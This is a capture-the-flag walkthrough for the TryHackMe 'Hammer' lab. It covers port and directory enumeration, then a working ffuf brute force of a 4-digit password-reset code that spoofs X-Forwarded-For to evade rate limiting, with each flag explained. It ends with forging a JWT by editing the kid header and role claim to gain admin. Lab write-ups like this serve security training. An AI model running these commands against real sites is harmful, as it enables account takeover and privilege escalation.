<code>
## Hammer
  
https://tryhackme.com/r/room/hammer
### Service Enumeration


┌──(kali㉿kali)-[~]
└─$ nmap -p- -Pn 10.10.80.225
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
                                                                             
┌──(kali㉿kali)-[~]
└─$ nmap -A -p1337  -Pn 10.10.80.225
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 08:03 EST
Nmap scan report for 10.10.80.225
Host is up (0.032s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds


┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.80.225:1337/hmr_FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.80.225:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 32ms]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 31ms]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 4833ms]
logs                    [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 32ms]



┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.80.225:1337 -x php,txt,html  

/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 1326]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.80.225:1337/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/vendor               (Status: 301) [Size: 320] [--> http://10.10.80.225:1337/vendor/]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> logout.php]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.80.225:1337/phpmyadmin/]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/reset_password.php   (Status: 200) [Size: 1664]
/server-status        (Status: 403) [Size: 279]



### http://10.10.80.225:1337/hmr_logs/error.logs

[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down

We know username tester@hammer.thm a need reset password and confirm by 4-digit code
## we use grute force atack 

### create list of digits
printf "%04d\n" {0..9999} > count-9999.txt
###  create list of fake IPs
for X in {0..255}; do for Y in {0..255}; do echo "192.168.$X.$Y"; done; done > fake_ip.txt

## Run attack
ffuf -w count-9999.txt:W1 -w fake_ip_cut.txt:W2 -u "http://<target_IP>:1337/reset_password.php" -X "POST" -d "recovery_code=W1&s=80" -b "PHPSESSID=<SESSIONID>" -H "X-Forwarded-For: W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -mode pitchfork -fw 1 -rate 100 -o output.txt

**Explaining**
**-w** — This is naming the two lists we are using. Both are followed by a colon : and then the code we will use when Fuzzing, e.g. you will see W1 where we are putting the auth code, and W2 where we put the IPs.

**-u** This is our target URL.

**-X** Type of request, this is a POST request, which I found out by capturing traffic via Burpsuite and checking.

**-d** This assigns text to the body of the http message, this is known by capturing traffic in Burpsuite and then copy and pasting it. As you can see, we have put W1 here, which is the refence for ffuf to fuzz thecount-9999.txt file in this location.

**-b** This adds a cookie, here I am adding the PHPSESSID which I get from the client by going into the dev tools and looking in the storage tab. If this is not included we get Time elapsed. Please try again later.

**-H** Sets headers, such as the **X-Forwarded-For which we are spoofing** with W2 and using to bypass the rate limiting. The server thinks the requests are coming from different hosts, so doesn’t count them together. We also add a content-type header for the server to know how to handle the request, this is taken from captured traffic in Burpsuite.

**-fr** We want to filter our results, and only get back the result that work. I know from trial and error that if we put in an invalid code the webpage gives a warning saying “Invalid or expired recovery code!”, meaning if we see the word “Invalid” in the response, we can just chuck it in the bin. This will keep the output of ffuf neat and tidy.

**-mode** pitchfork By default, if you use multiple wordlists ffuf will do a cluster bomb attack. Which is attack with every possible combination from the two lists. We don’t actually care about the combinations, we just want to test each auth code once. So we set it to pitchfork, this means the first entry of both lists is sent, then the second entry of each list, then the third and so on and so on until a list is exhausted.

**-fw** 1 I was having issues with too much output coming through, perhaps because -fr wasn’t capturing all errors. So I saw most invalid responses had a word count of 1, so I filtered for that also.

**-rate** This is used to set a target rate (attacks per second) for ffuf, I had never used it and thought I would get into the use of it, seeing as most bug bounties etc state a rate requirement.

**-o** Saves the output (in JSON format) to a stated file, I wanted this to review for error handling. I believe this is saved as one horribly long line, so you can use this tool to make it neat. Note — I didn’t end up needing to use the tool in the end to review errors.

Get 4-digits code and reset password

**Get tester access**

admin access get over JWT Token in jwt.io modify 

We changed **kid**, which is identifying which key was used to sign the token. I had assumed the location was "/var/www/html/188ade1.key as this is typically the ‘base folder’ on a web server, meaning this is likely where the ls command was ran.
We changed the **role** to **admin** within the payload, with the assumption the server identifies us as admin and gives us elevated rights. If this didn’t work I would have also looked at editing user_id. We put in the key value(from 188ade1.key) at the bottom to sign the token

**Get admin access**
<\code>
